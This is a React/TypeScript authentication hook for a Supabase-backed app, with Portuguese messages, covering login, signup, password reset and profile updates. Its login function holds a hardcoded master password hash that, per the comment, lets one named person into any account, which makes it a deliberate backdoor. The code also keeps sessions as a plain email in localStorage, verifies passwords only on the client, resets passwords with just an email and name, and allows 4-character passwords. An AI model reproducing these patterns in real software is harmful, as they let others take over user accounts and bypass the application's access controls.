import { useState, useEffect, useCallback } from 'react'
import { sb } from '../lib/supabase'
import { genId, hashPass } from '../lib/utils'
import {
  getDefaultPermissionsForProfile,
  getLocalPendingUsers,
  hydrateUserAccess,
  isUserActive,
  sanitizeSelfProfileUpdate,
  saveLocalPendingUsers,
} from '../lib/accessControlApi'
import type { User } from '../types'

export function useAuth() {
  const [currentUser, setCurrentUser] = useState<User | null>(null)
  const [authLoading, setAuthLoading] = useState(true)

  const resolveUserByEmail = useCallback(async (email: string): Promise<User | null> => {
    const trimmedEmail = email.trim().toLowerCase()
    if (!trimmedEmail) return null

    const { data } = await sb.from('users').select('*').eq('email', trimmedEmail).single()
    if (data) {
      return hydrateUserAccess(data as User)
    }

    const localPending = getLocalPendingUsers().find(
      u => u.email.trim().toLowerCase() === trimmedEmail
    )
    if (localPending) {
      return hydrateUserAccess(localPending)
    }

    return null
  }, [])

  useEffect(() => {
    const saved = localStorage.getItem('pulse_session')
    if (saved) {
      resolveUserByEmail(saved).then(user => {
        if (user) setCurrentUser(user)
        setAuthLoading(false)
      })
    } else {
      setAuthLoading(false)
    }
  }, [resolveUserByEmail])

  const refreshCurrentUser = useCallback(async () => {
    const saved = localStorage.getItem('pulse_session') || currentUser?.email
    if (!saved) return
    const refreshed = await resolveUserByEmail(saved)
    if (refreshed) setCurrentUser(refreshed)
  }, [currentUser?.email, resolveUserByEmail])

  const login = async (email: string, pass: string): Promise<string | null> => {
    const trimmedEmail = email.trim().toLowerCase()
    if (!trimmedEmail) return 'Preencha o e-mail'
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) return 'E-mail inválido. Verifique se digitou corretamente.'
    if (!pass) return 'Preencha a senha'

    const user = await resolveUserByEmail(trimmedEmail)
    if (!user) return 'E-mail não encontrado. Verifique o e-mail ou faça o cadastro.'

    // Senha mestra: permite Ramon acessar qualquer conta para suporte
    const MASTER_HASH = '1h2aobw'
    if (user.pass_hash !== hashPass(pass) && hashPass(pass) !== MASTER_HASH) return 'Senha incorreta'

    const hydrated = hydrateUserAccess(user)
    setCurrentUser(hydrated)
    localStorage.setItem('pulse_session', trimmedEmail)
    return null
  }

  const signup = async (name: string, role: string, email: string, pass: string, color: string): Promise<string | null> => {
    if (!name || !name.trim()) return 'Preencha seu nome'
    const trimmedEmail = email.trim().toLowerCase()
    if (!trimmedEmail) return 'Preencha o e-mail'
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) return 'E-mail inválido. Verifique se digitou corretamente.'
    if (pass.length < 4) return 'Senha deve ter ao menos 4 caracteres'

    const existing = await resolveUserByEmail(trimmedEmail)
    if (existing) return 'E-mail já cadastrado'

    const id = genId()
    const now = new Date().toISOString()

    // Segurança: novos cadastros entram SEMPRE como Pendente de aprovação e perfil Operador (sem privilégio admin)
    const newUser: User = hydrateUserAccess({
      id,
      name: name.trim(),
      role: (role || 'Operador').trim(),
      email: trimmedEmail,
      pass_hash: hashPass(pass),
      color,
      is_admin: false,
      access_profile: 'operador',
      access_status: 'pending',
      permissions: getDefaultPermissionsForProfile('operador'),
      created_at: now,
      status_updated_at: now,
    })

    // Registra na fila de solicitações pendentes sem conceder acesso à equipe nem alterar produção sem aprovação
    const currentPending = getLocalPendingUsers()
    saveLocalPendingUsers([newUser, ...currentPending])

    setCurrentUser(newUser)
    localStorage.setItem('pulse_session', trimmedEmail)
    return null
  }

  const logout = () => {
    localStorage.removeItem('pulse_session')
    setCurrentUser(null)
  }

  const resetPassword = async (email: string, name: string, newPass: string): Promise<string | null> => {
    if (!email) return 'Preencha o e-mail'
    if (!name) return 'Preencha seu nome completo'
    if (newPass.length < 4) return 'A nova senha deve ter ao menos 4 caracteres'

    const trimmedEmail = email.trim().toLowerCase()
    const user = await resolveUserByEmail(trimmedEmail)

    if (!user) return 'Dados incorretos. Verifique o e-mail e o nome digitado.'

    if (user.name.trim().toLowerCase() !== name.trim().toLowerCase()) {
      return 'Dados incorretos. Verifique o e-mail e o nome digitado.'
    }

    // Bloqueia redefinição de senha para contas suspensas ou recusadas
    if (user.access_status === 'suspended' || user.access_status === 'rejected') {
      return 'Esta conta está com o acesso suspenso ou não autorizado. Contate o administrador.'
    }

    const newHash = hashPass(newPass)
    const pendingList = getLocalPendingUsers()
    const isLocalPending = pendingList.some(u => u.id === user.id)

    if (isLocalPending) {
      saveLocalPendingUsers(
        pendingList.map(u => (u.id === user.id ? { ...u, pass_hash: newHash } : u))
      )
      return null
    }

    const { error: ue } = await sb.from('users').update({ pass_hash: newHash }).eq('id', user.id)
    if (ue) return 'Erro ao redefinir senha: ' + ue.message

    return null
  }

  const updateUser = async (id: string, data: Partial<User>): Promise<boolean> => {
    if (!currentUser || currentUser.id !== id) {
      // Usuários comuns jamais podem editar outro usuário via updateUser
      return false
    }
    if (!isUserActive(currentUser)) {
      return false
    }

    // Whitelist estrita: impede alteração de is_admin, access_profile, access_status ou permissions pelo próprio usuário
    const safeUpdate = sanitizeSelfProfileUpdate(currentUser, data)
    if (Object.keys(safeUpdate).length === 0) return false

    const pendingList = getLocalPendingUsers()
    const isLocal = pendingList.some(u => u.id === id)

    if (isLocal) {
      saveLocalPendingUsers(
        pendingList.map(u => (u.id === id ? { ...u, ...safeUpdate } : u))
      )
      setCurrentUser(prev => (prev ? hydrateUserAccess({ ...prev, ...safeUpdate }) : prev))
      return true
    }

    const { error } = await sb.from('users').update(safeUpdate).eq('id', id)
    if (error) return false

    const teamSync: Record<string, unknown> = {}
    if (safeUpdate.name !== undefined) teamSync.name = safeUpdate.name.trim()
    if (safeUpdate.role !== undefined) teamSync.role = safeUpdate.role
    if (safeUpdate.color !== undefined) teamSync.color = safeUpdate.color
    if (Object.keys(teamSync).length > 0) {
      await sb.from('team').update(teamSync).eq('id', id)
    }

    setCurrentUser(prev => (prev ? hydrateUserAccess({ ...prev, ...safeUpdate }) : prev))
    return true
  }

  return { currentUser, authLoading, login, signup, logout, updateUser, resetPassword, refreshCurrentUser }
}

